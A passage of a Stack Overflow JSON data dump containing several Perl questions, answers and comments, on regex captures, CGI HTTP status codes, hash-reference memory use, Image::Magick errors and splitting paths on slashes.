0, "last_activity_date": 1457354172, "creation_date": 1457354172, "answer_id": 35843933, "question_id": 35843679, "link": "https://stackoverflow.com/questions/35843679/perl-grouping-things-and-hierarchical-matching/35843933#35843933", "title": "perl Grouping things and hierarchical matching", "body": "<pre><code>my $t = \"housecats\";\nmy ($m) = $t=~m/house(cat|)/gn;\nprint $m;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 1, "last_activity_date": 1457373980, "creation_date": 1457373980, "answer_id": 35850780, "question_id": 35843679, "link": "https://stackoverflow.com/questions/35843679/perl-grouping-things-and-hierarchical-matching/35850780#35850780", "title": "perl Grouping things and hierarchical matching", "body": "<p>What you're doing with this code</p>\n\n<pre><code>my $t = \"housecats\";\nmy ($m) = $t =~ m/house(cat|)/;\nprint $m;\n</code></pre>\n\n<p>is copying the first <em>capture</em> into <code>$m</code>. Parentheses <code>()</code> in the pattern indicate which parts of the matching string to capture and store into built-in variables <code>$1</code>, <code>$2</code> etc. You can have as many captures as you like, and they are numbered in the same order as the opening parentheses appears in the pattern</p>\n\n<p>What <code>perlrequick</code> is talking about is what constitutes a <em>successful match</em>. Normally you would write</p>\n\n<pre><code>my $t = \"housecats\";\nmy $success = $t =~ m/house(cat|)/;\nprint $success ? \"matched\\n\" : \"no match\\n\";\n</code></pre>\n\n<p>This code produces</p>\n\n<pre><code>matched\n</code></pre>\n\n<p>as the document describes. If you set <code>$t</code> to <code>housemartin</code> then the result is the same because the regex pattern successfully finds <code>house</code>. But if <code>$t</code> is <code>hosepipe</code> then we see <code>no match</code> because the string contains neither <code>house</code> nor <code>housecat</code></p>\n\n<p>If you need to extract parts of the matched string then you must use captures as described above. You can access the whole string that was matched by accessing the built-in variable <code>$&amp;</code>, but doing so causes unacceptable performance degradation in all but the latest Perl versions. For backward-compatability you should simply <em>capture</em> the whole pattern by writing</p>\n\n<pre><code>my $t = \"housecats\";\nmy ($m) = $t =~ m/(house(cat|))/;\nprint $m;\n</code></pre>\n\n<p>which produces <code>housecat</code> as you expected. It also sets the values of <code>$1</code> and <code>$2</code> to <code>housecat</code> and <code>cat</code> respectively</p>\n"}], "owner": {"reputation": 11, "user_id": 4559900, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/82c0b7b9cdb19366431b945a7912cbda?s=128&d=identicon&r=PG&f=1", "display_name": "tar", "link": "https://stackoverflow.com/users/4559900/tar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 61, "favorite_count": 0, "answer_count": 3, "score": 0, "last_activity_date": 1457374265, "creation_date": 1457353391, "last_edit_date": 1457373246, "question_id": 35843679, "link": "https://stackoverflow.com/questions/35843679/perl-grouping-things-and-hierarchical-matching", "title": "perl Grouping things and hierarchical matching", "body": "<p>I've been testing Perl regex code what is written in the <code>perlrequick</code> section on <a href=\"http://perldoc.perl.org/perlrequick.html#Grouping-things-and-hierarchical-matching\" rel=\"nofollow\"><em>Grouping things and hierarchical matching</em></a></p>\n\n<p>This my Perl code</p>\n\n<pre><code>my $t = \"housecats\";\nmy ($m) = $t =~ m/house(cat|)/;\nprint $m; \n</code></pre>\n\n<p>The output is <strong>cat</strong>, but should be as written in the documentation</p>\n\n<pre><code>/house(cat|)/;  # matches either 'housecat' or 'house'\n</code></pre>\n\n<p>What is wrong? Is there something amiss?</p>\n"}, {"tags": ["perl", "rest", "http-headers", "cgi", "http-status-codes"], "comments": [{"owner": {"reputation": 793701, "user_id": 19068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d2d3229ed1961d2bd81853242493247?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/19068/quentin"}, "edited": false, "score": 4, "creation_date": 1457351107, "post_id": 35842815, "comment_id": 59351253, "body": "Why are you mixing GGI.pm (removed from Core in favour of alternatives) with hand rolled CGI environment parsing (no, just no, no, no)?!"}], "answers": [{"tags": [], "owner": {"reputation": 2682, "user_id": 4072843, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/tKkUM.jpg?s=128&g=1", "display_name": "Castaglia", "link": "https://stackoverflow.com/users/4072843/castaglia"}, "is_accepted": false, "score": 0, "last_activity_date": 1458673891, "last_edit_date": 1495542227, "creation_date": 1458673891, "answer_id": 36163167, "question_id": 35842815, "link": "https://stackoverflow.com/questions/35842815/perl-cgi-with-http-status-codes-in-restful-api/36163167#36163167", "title": "Perl CGI with HTTP Status Codes in RESTful api", "body": "<p>Per this <a href=\"https://stackoverflow.com/questions/19872574/perl-cgi-with-http-status-codes\">similar SO post</a>, you might try:</p>\n\n<pre><code>else\n{\n    $cgi-&gt;$header-&gt;status('405 Method Not Allowed')\n    print $cgi-&gt;header('text/plain');\n}\n</code></pre>\n\n<p>instead of your:</p>\n\n<pre><code>else\n{\n    print $cgi-&gt;header(\n        -type=&gt;'text/plain',\n        -status=&gt; '405 Method Not Allowed'\n    );\n }\n</code></pre>\n"}], "owner": {"reputation": 33, "user_id": 2005063, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/598f60ac4f263652919bb5c46959a2b7?s=128&d=identicon&r=PG", "display_name": "npavan063", "link": "https://stackoverflow.com/users/2005063/npavan063"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 716, "favorite_count": 1, "answer_count": 1, "score": -1, "last_activity_date": 1458673891, "creation_date": 1457350929, "question_id": 35842815, "link": "https://stackoverflow.com/questions/35842815/perl-cgi-with-http-status-codes-in-restful-api", "title": "Perl CGI with HTTP Status Codes in RESTful api", "body": "<p>I have the following validation in a CGI script that will check for the GET method and return a 405 HTTP status code if the GET method is not used. Unfortunately it is still returning a 200 Status OK when using POST or PUT.</p>\n\n<pre><code>my ($buffer);\n# Read in text\n$ENV{'REQUEST_METHOD'} =~ tr/a-z/A-Z/;\nif ($ENV{'REQUEST_METHOD'} eq \"GET\")\n  {\n$buffer = $ENV{'QUERY_STRING'};\n  }\nelse\n {\n  print $cgi-&gt;header(\n    -type=&gt;'text/plain',\n    -status=&gt; '405 Method Not Allowed'\n  );\n }\n</code></pre>\n\n<p>but when i use LWP at client and print status_code it still gives 200 OK and when i print content it is printing the Status: 405 </p>\n\n<p>code i am using at Client:</p>\n\n<pre><code>use LWP;\nuse HTTP:Request::Common;\n\nmy $ua = LWP::UserAgent-&gt;new;\nmy $req =PUT(\"/path/to/request\");\n\nmy $result = $ua-&gt;request($req);\n\nif($result-&gt;is_success) {\n  print \"HTTP RESPONSE CODE:\" , $result-&gt;status_line;\n  print $result-&gt;decoded_content;\n}\n</code></pre>\n\n<p>from above code it prints the following information on success</p>\n\n<pre><code> HTTP RESPONSE CODE: 200 OK\n Status: 405 Method Not Allowed\n \"some text regarding why method not allowed\"\n Requested Method Not allowed\n</code></pre>\n\n<p>How can i match the status_line to the value coming from CGI header?</p>\n"}, {"tags": ["perl"], "answers": [{"tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": true, "score": 1, "last_activity_date": 1457351487, "creation_date": 1457351487, "answer_id": 35843024, "question_id": 35842418, "link": "https://stackoverflow.com/questions/35842418/memory-usage-perl-function/35843024#35843024", "title": "Memory usage perl function", "body": "<p>Disk usage should be the same, as there's no I/O operation. Memory consumption will be larger in the first case, because you need one more scalar variable $hash. It will only store a reference, so the difference is minimal.</p>\n\n<p>Really copying the hash can consume a lot more memory, though:</p>\n\n<pre><code>sub subroutine {\n    my %hash = %{ $_[0] };\n    my $var_1 = $hash{var_1};\n    # ...\n}\n</code></pre>\n"}], "owner": {"reputation": 5, "user_id": 6028741, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a5b67094cfa5e43940fc9d3199cec8bf?s=128&d=identicon&r=PG&f=1", "display_name": "Carlos", "link": "https://stackoverflow.com/users/6028741/carlos"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 83, "favorite_count": 0, "accepted_answer_id": 35843024, "answer_count": 1, "score": 0, "last_activity_date": 1457351487, "creation_date": 1457349761, "question_id": 35842418, "link": "https://stackoverflow.com/questions/35842418/memory-usage-perl-function", "title": "Memory usage perl function", "body": "<p>There's any difference, concerning to memory and/or disc usage, between these two ways of passing variables to a subroutine:</p>\n\n<pre><code>&amp;subrutine_1($hash_reference);\n\nsub subrutine\n{\n    my $hash = $_[0];\n    my $var_1 = $$hash{'var_1'};\n    my $var_2 = $$hash{'var_2'};\n    my $var_3 = $$hash{'var_3'};\n}\n</code></pre>\n\n<p>or</p>\n\n<pre><code>&amp;subrutine_1($hash_reference);\n\nsub subrutine\n{\n    my $var_1 = $_[0]{'var_1'};\n    my $var_2 = $_[0]{'var_2'};\n    my $var_3 = $_[0]{'var_3'};\n}\n</code></pre>\n\n<p>Thanks!</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1457344515, "post_id": 35840522, "comment_id": 59347230, "body": "You haven&#39;t shown the most important detail: how is <code>$output</code> initialized?"}, {"owner": {"reputation": 105, "user_id": 4251363, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/24e31631b0a3805b9b84453ca89c1606?s=128&d=identicon&r=PG&f=1", "display_name": "Developer", "link": "https://stackoverflow.com/users/4251363/developer"}, "edited": false, "score": 0, "creation_date": 1457345179, "post_id": 35840522, "comment_id": 59347673, "body": "I have added the remaining code snippet.Please look into this."}], "answers": [{"comments": [{"owner": {"reputation": 105, "user_id": 4251363, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/24e31631b0a3805b9b84453ca89c1606?s=128&d=identicon&r=PG&f=1", "display_name": "Developer", "link": "https://stackoverflow.com/users/4251363/developer"}, "edited": false, "score": 0, "creation_date": 1457345511, "post_id": 35840906, "comment_id": 59347868, "body": "it still giving &quot;Exception 410: no images defined `Image::Magick&#39; at logo_sprit.pl line 65.&quot;"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "reply_to_user": {"reputation": 105, "user_id": 4251363, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/24e31631b0a3805b9b84453ca89c1606?s=128&d=identicon&r=PG&f=1", "display_name": "Developer", "link": "https://stackoverflow.com/users/4251363/developer"}, "edited": false, "score": 0, "creation_date": 1457345598, "post_id": 35840906, "comment_id": 59347917, "body": "@Codeshow: Yes, but you can&#39;t call methods on something that&#39;s not an object. Now it&#39;s time to figure out why the Montage call failed."}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "reply_to_user": {"reputation": 105, "user_id": 4251363, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/24e31631b0a3805b9b84453ca89c1606?s=128&d=identicon&r=PG&f=1", "display_name": "Developer", "link": "https://stackoverflow.com/users/4251363/developer"}, "edited": false, "score": 0, "creation_date": 1457345682, "post_id": 35840906, "comment_id": 59347969, "body": "Try printing the return value of the <code>Read</code> method, too."}, {"owner": {"reputation": 105, "user_id": 4251363, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/24e31631b0a3805b9b84453ca89c1606?s=128&d=identicon&r=PG&f=1", "display_name": "Developer", "link": "https://stackoverflow.com/users/4251363/developer"}, "edited": false, "score": 0, "creation_date": 1457345731, "post_id": 35840906, "comment_id": 59347994, "body": "Is there any specific format that &quot;Image::Magick&quot; accepts as my images are in format &quot;abc.jpg?0.987789&amp;&quot;"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "reply_to_user": {"reputation": 105, "user_id": 4251363, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/24e31631b0a3805b9b84453ca89c1606?s=128&d=identicon&r=PG&f=1", "display_name": "Developer", "link": "https://stackoverflow.com/users/4251363/developer"}, "edited": false, "score": 0, "creation_date": 1457345813, "post_id": 35840906, "comment_id": 59348048, "body": "@Codeshow: What do you mean by &quot;format&quot;? What you show is a filename."}, {"owner": {"reputation": 105, "user_id": 4251363, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/24e31631b0a3805b9b84453ca89c1606?s=128&d=identicon&r=PG&f=1", "display_name": "Developer", "link": "https://stackoverflow.com/users/4251363/developer"}, "edited": false, "score": 0, "creation_date": 1457345877, "post_id": 35840906, "comment_id": 59348087, "body": "$VAR1 = [           &#39;/home/www/html/media-sea/hk/logos/swift_135x50.jpg?0.790242&zwnj;&#8203;741085255&amp;&#39;,           &#39;/home/www/html/media-sea/hk/logos/monster_160x60_border.gif&zwnj;&#8203;?0.520726705307151&amp;&#39;         ]; $VAR1 = bless( [], &#39;Image::Magick&#39; ); Exception 410: no images defined `Image::Magick&#39; at logo_sprit.pl line 65."}, {"owner": {"reputation": 105, "user_id": 4251363, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/24e31631b0a3805b9b84453ca89c1606?s=128&d=identicon&r=PG&f=1", "display_name": "Developer", "link": "https://stackoverflow.com/users/4251363/developer"}, "edited": false, "score": 0, "creation_date": 1457345957, "post_id": 35840906, "comment_id": 59348144, "body": "you can see my @$imagedata  has 2 images and output of Read method."}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "reply_to_user": {"reputation": 105, "user_id": 4251363, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/24e31631b0a3805b9b84453ca89c1606?s=128&d=identicon&r=PG&f=1", "display_name": "Developer", "link": "https://stackoverflow.com/users/4251363/developer"}, "edited": false, "score": 0, "creation_date": 1457346084, "post_id": 35840906, "comment_id": 59348231, "body": "No, that&#39;s what $im contains, not what Read returns. <code>warn $im-&gt;Read(...)</code>"}, {"owner": {"reputation": 105, "user_id": 4251363, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/24e31631b0a3805b9b84453ca89c1606?s=128&d=identicon&r=PG&f=1", "display_name": "Developer", "link": "https://stackoverflow.com/users/4251363/developer"}, "edited": false, "score": 0, "creation_date": 1457346320, "post_id": 35840906, "comment_id": 59348425, "body": "read bless[] is blank , it means Read method has not read my images.So, what I am asking is ,Does &quot;Image::Magick &quot; accepts only image of type &quot;abc.jpg&quot; or it can  accept &quot;abc.jpg?0.98978&amp;&quot; format also. Or we need to pass some parameter to gert accepted such images format."}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "reply_to_user": {"reputation": 105, "user_id": 4251363, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/24e31631b0a3805b9b84453ca89c1606?s=128&d=identicon&r=PG&f=1", "display_name": "Developer", "link": "https://stackoverflow.com/users/4251363/developer"}, "edited": false, "score": 0, "creation_date": 1457346393, "post_id": 35840906, "comment_id": 59348472, "body": "I don&#39;t know what format your images are in. As for the filename, my installation is able to read even filenames containing ? and &amp;. The output of Read should tell you what the problem is."}, {"owner": {"reputation": 105, "user_id": 4251363, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/24e31631b0a3805b9b84453ca89c1606?s=128&d=identicon&r=PG&f=1", "display_name": "Developer", "link": "https://stackoverflow.com/users/4251363/developer"}, "edited": false, "score": 0, "creation_date": 1457346465, "post_id": 35840906, "comment_id": 59348524, "body": "Exception 435: unable to open image `/home/www/html/images/logos/135x50.jpg?0.800537361135422&amp;&#39;: No such file or directory"}, {"owner": {"reputation": 105, "user_id": 4251363, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/24e31631b0a3805b9b84453ca89c1606?s=128&d=identicon&r=PG&f=1", "display_name": "Developer", "link": "https://stackoverflow.com/users/4251363/developer"}, "edited": false, "score": 0, "creation_date": 1457346482, "post_id": 35840906, "comment_id": 59348534, "body": "This is returned by Read method"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "reply_to_user": {"reputation": 105, "user_id": 4251363, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/24e31631b0a3805b9b84453ca89c1606?s=128&d=identicon&r=PG&f=1", "display_name": "Developer", "link": "https://stackoverflow.com/users/4251363/developer"}, "edited": false, "score": 0, "creation_date": 1457346685, "post_id": 35840906, "comment_id": 59348679, "body": "So, now you know. What does <code>warn -e $image</code> output?"}], "tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": false, "score": 3, "last_activity_date": 1457346753, "last_edit_date": 1457346753, "creation_date": 1457345340, "answer_id": 35840906, "question_id": 35840522, "link": "https://stackoverflow.com/questions/35840522/imagemagick-module-using-with-perl/35840906#35840906", "title": "Image::Magick module using with perl", "body": "<p>It seems <code>Montage</code> returns an <code>Image::Magick</code> object on success, and string containing the exception otherwise. Check the success with</p>\n\n<pre><code>my $output = $im-&gt;Montage (tile =&gt; $tile, geometry=&gt;'135x50');\ndie $output unless ref $output;\n\n$output-&gt;Write($filename);\n</code></pre>\n\n<p>Similarly, you should check the output of the <code>Read</code> method - it should be empty on success. Otherwise, it contains the exception text.</p>\n"}], "owner": {"reputation": 105, "user_id": 4251363, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/24e31631b0a3805b9b84453ca89c1606?s=128&d=identicon&r=PG&f=1", "display_name": "Developer", "link": "https://stackoverflow.com/users/4251363/developer"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 151, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1457346753, "creation_date": 1457344088, "last_edit_date": 1457345125, "question_id": 35840522, "link": "https://stackoverflow.com/questions/35840522/imagemagick-module-using-with-perl", "title": "Image::Magick module using with perl", "body": "<pre><code>my $im = Image::Magick-&gt;new();\nfor my $image (@$imagedata) {\n    $im-&gt;Read ($image);\n}\nmy $tile = \"1x\";\nmy $output = $im-&gt;Montage (tile =&gt; $tile, geometry=&gt;'135x50');\n$output-&gt;Write(\"sprite_logos.png\");\n</code></pre>\n\n<p>I have written above code ,I am getting as error \"Can't locate object method \"Write\" via package \"Exception 410: no images defined <code>Image::Magick'\" (perhaps you forgot to load \"Exception 410: no images defined</code>Image::Magick'\"?) at logo_sprit.pl line 65.\"</p>\n\n<p>When checked for issue after debugging.I found that this module is having some problem with images of type (41726.jpg?0.641405799749506&amp;,85872.jpg)</p>\n\n<p>Can Someone help me in this issue.</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 61610, "user_id": 725418, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/82ac2dc3e1ad4b7187f245c416528df9?s=128&d=identicon&r=PG", "display_name": "TLP", "link": "https://stackoverflow.com/users/725418/tlp"}, "edited": false, "score": 1, "creation_date": 1457339045, "post_id": 35838256, "comment_id": 59344345, "body": "When in doubt to what your variables contain: <code>use Data::Dumper; print Dumper \\@split;</code>"}], "answers": [{"tags": [], "owner": {"reputation": 37822, "user_id": 1231450, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/b9c98b4ce12bf9fd925d8c35c8861bb2?s=128&d=identicon&r=PG", "display_name": "Jan", "link": "https://stackoverflow.com/users/1231450/jan"}, "is_accepted": false, "score": 1, "last_activity_date": 1457336468, "last_edit_date": 1457336468, "creation_date": 1457335905, "answer_id": 35838377, "question_id": 35838256, "link": "https://stackoverflow.com/questions/35838256/perl-split-string-based-on-forward-slash/35838377#35838377", "title": "Perl split string based on forward slash", "body": "<p>Simply bind it to the end:</p>\n\n<pre><code>(\\d+)$\n# look for digits at the end of the string\n</code></pre>\n\n<p>See <a href=\"https://regex101.com/r/pR0cC8/1\" rel=\"nofollow\">a demo on regex101.com</a>. The capturing group is only for clarification though not really needed in this case.</p>\n\n<p>In <code>Perl</code> this would be (I am a PHP/Python guy, so bear with me when it is ugly)</p>\n\n<pre><code>my $path = \"/bla/bla/bla/20160306\";\n$path =~ /(\\d+)$/;\nprint $1;\n</code></pre>\n\n<p>See <a href=\"http://ideone.com/tEVIOZ\" rel=\"nofollow\">a demo on ideone.com</a>.</p>\n"}, {"comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 12178, "user_id": 449355, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/f5ad58feb8de81d966a3397a9c9239aa?s=128&d=identicon&r=PG&f=1", "display_name": "unk1102", "link": "https://stackoverflow.com/users/449355/unk1102"}, "edited": false, "score": 0, "creation_date": 1457336407, "post_id": 35838395, "comment_id": 59343061, "body": "@user449355 Then something else is wrong.  I copy pasted your string.  This <i>has to</i> work if all else is good."}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 7, "last_activity_date": 1585207673, "last_edit_date": 1585207673, "creation_date": 1457335993, "answer_id": 35838395, "question_id": 35838256, "link": "https://stackoverflow.com/questions/35838256/perl-split-string-based-on-forward-slash/35838395#35838395", "title": "Perl split string based on forward slash", "body": "<p>Since the path starts with the delimiter <code>/</code> itself, <code>split</code> returns a list with an empty string first (to the left of the first <code>/</code>); one element more. Thus the posted code miscounts by one and returns the one before last element (subdirectory) in the path, not the date.</p>\n\n<p>If date is always the last thing in the string you can pick the last element </p>\n\n<pre><code>my $date = (split '/', $path)[-1];\n</code></pre>\n\n<p>where i've used <code>''</code> for delimiters so to not have to escape <code>/</code>.  (This, however, may confuse since the separator pattern <em>is a regex</em> and <code>//</code> convey that, while <code>''</code> may appear to merely quote a string.)</p>\n\n<hr>\n\n<p>This can also be done with regex</p>\n\n<pre><code>my @parts = $path =~ m{([^/]+)}g;\n</code></pre>\n\n<p>With this there can be no inital empty string.  Or, the last part can be picked out of the full list as above, with <code>($path =~ m{...}g)[-1]</code>, but if you indeed only need the last bit then extract it directly </p>\n\n<pre><code>my ($last_part) = $path =~ m{.*/(.*)};\n</code></pre>\n\n<p>Here the \"greedy\" <code>.*</code> matches everything in the string up to the last instance of the next subpattern (<code>/</code> here), thus getting us to the last part of the path, which is then captured.  The regex match operator returns its matches only when it is in the <em>list context</em> so parens on the left are needed.</p>\n\n<hr>\n\n<p>What brings us to the fact that you are parsing a path, and there are libraries dedicated to that. </p>\n\n<p>For splitting a path into its components one tool is <code>splitdir</code> from <a href=\"https://perldoc.perl.org/File/Spec.html\" rel=\"nofollow noreferrer\">File::Spec</a></p>\n\n<pre><code>use File::Spec;\n\nmy @parts = File::Spec-&gt;splitdir($path);\n</code></pre>\n\n<p>If the path starts with a <code>/</code> we'll again get an empty string for the first element (by design, see docs).  That can then be removed, if there</p>\n\n<pre><code>shift @parts if $parts[0] eq '';\n</code></pre>\n\n<p>Again, the last element alone can be had like in the other examples.</p>\n"}, {"tags": [], "owner": {"reputation": 5455, "user_id": 3961170, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/PtFol.jpg?s=128&g=1", "display_name": "mkHun", "link": "https://stackoverflow.com/users/3961170/mkhun"}, "is_accepted": false, "score": 0, "last_activity_date": 1457340010, "creation_date": 1457340010, "answer_id": 35839372, "question_id": 35838256, "link": "https://stackoverflow.com/questions/35838256/perl-split-string-based-on-forward-slash/35839372#35839372", "title": "Perl split string based on forward slash", "body": "<p>Try this</p>\n\n<p>Use look ahead for to do it. It capture the <code>/</code> by splitting. Then substitute the data using <code>/</code> for remove the slash.   </p>\n\n<pre><code>my $path = \"/a/b/c/20160306\";\nmy $date = (split(/(?=\\/)/,$path))[3];\n$date=~s/^\\///;\nprint $date;\n</code></pre>\n\n<p>Or else use pattern matching with grouping for to do it.</p>\n\n<pre><code>my $path = \"/a/b/c/20160306\";\nmy @data = $path =~m/\\/(\\w+)/g;\nprint $data[3];\n</code></pre>\n"}], "owner": {"reputation": 12178, "user_id": 449355, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/f5ad58feb8de81d966a3397a9c9239aa?s=128&d=identicon&r=PG&f=1", "display_name": "unk1102", "link": "https://stackoverflow.com/users/449355/unk1102"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 7029, "favorite_count": 1, "accepted_answer_id": 35838395, "answer_count": 3, "score": 3, "last_activity_date": 1589570210, "creation_date": 1457335408, "last_edit_date": 1589570210, "question_id": 35838256, "link": "https://stackoverflow.com/questions/35838256/perl-split-string-based-on-forward-slash", "title": "Perl split string based on forward slash", "body": "<p>I am new to Perl, so this is basic question. I have a string as shown below. I am interested in taking date out of it, so thinking of splitting it using slash</p>\n\n<pre><code>my $path = \"/bla/bla/bla/20160306\";\nmy $date = (split(/\\//,$path))[3];#ideally 3 is date position in array after split\nprint $date;\n</code></pre>\n\n<p>However, I don't see the expected output, but instead I see 5 getting printed.</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 30226, "user_id": 2107876, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/975e7190aac72397465126f04f46f3f6?s=128&d=identicon&r=PG", "display_name": "laune", "link": "https://stackoverflow.com/users/2107876/laune"}, "edited": false, "score": 0, "creation_date": 1457337253, "post_id": 35837616, "comment_id": 59343466, "body": "perlre contains a section <i>Version 8 Regular Expressions</i> which provides a verbal description of the regex pattern matching mechanisms."}, {"owner": {"reputation": 5403, "user_id": 431698, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/59b288f9d5793f1c114f30837ae0ec44?s=128&d=identicon&r=PG", "display_name": "Jingguo Yao", "link": "https://stackoverflow.com/users/431698/jingguo-yao"}, "reply_to_user": {"reputation": 30226, "user_id": 2107876, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/975e7190aac72397465126f04f46f3f6?s=128&d=identicon&r=PG", "display_name": "laune", "link": "https://stackoverflow.com/users/2107876/laune"}, "edited": false, "score": 0, "creation_date": 1457358410, "post_id": 35837616, "comment_id": 59356043, "body": "@laune, I have just browsed  <i>Version 8 Regular Expressions</i>. But I can&#39;t find anything which is relevant to precedence. Could you please point out how it is relevant to precedence?"}, {"owner": {"reputation": 30226, "user_id": 2107876, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/975e7190aac72397465126f04f46f3f6?s=128&d=identicon&r=PG", "display_name": "laune", "link": "https://stackoverflow.com/users/2107876/laune"}, "edited": false, "score": 2, "creation_date": 1457368355, "post_id": 35837616, "comment_id": 59363450, "body": "I think that this text clarifies the issue, but you may have to read (a little) between the lines. - Anyway, there&#39;s never been a doubt about the precedence of parentheses, quantifiers, juxtaposition and alternatives within any of the regex systems of (early) *nix utilities, awk, Perl4, Perl5, Java, XML Schema, and lots of others. - What is bothering you??"}, {"owner": {"reputation": 5403, "user_id": 431698, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/59b288f9d5793f1c114f30837ae0ec44?s=128&d=identicon&r=PG", "display_name": "Jingguo Yao", "link": "https://stackoverflow.com/users/431698/jingguo-yao"}, "reply_to_user": {"reputation": 30226, "user_id": 2107876, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/975e7190aac72397465126f04f46f3f6?s=128&d=identicon&r=PG", "display_name": "laune", "link": "https://stackoverflow.com/users/2107876/laune"}, "edited": false, "score": 0, "creation_date": 1457401886, "post_id": 35837616, "comment_id": 59380466, "body": "@laune, thanks for the clarification. I just want a definitive reference specifying the precedence rules explicitly."}, {"owner": {"reputation": 30226, "user_id": 2107876, "user_type": "registered", "accept_rate": 88, "profile_image": 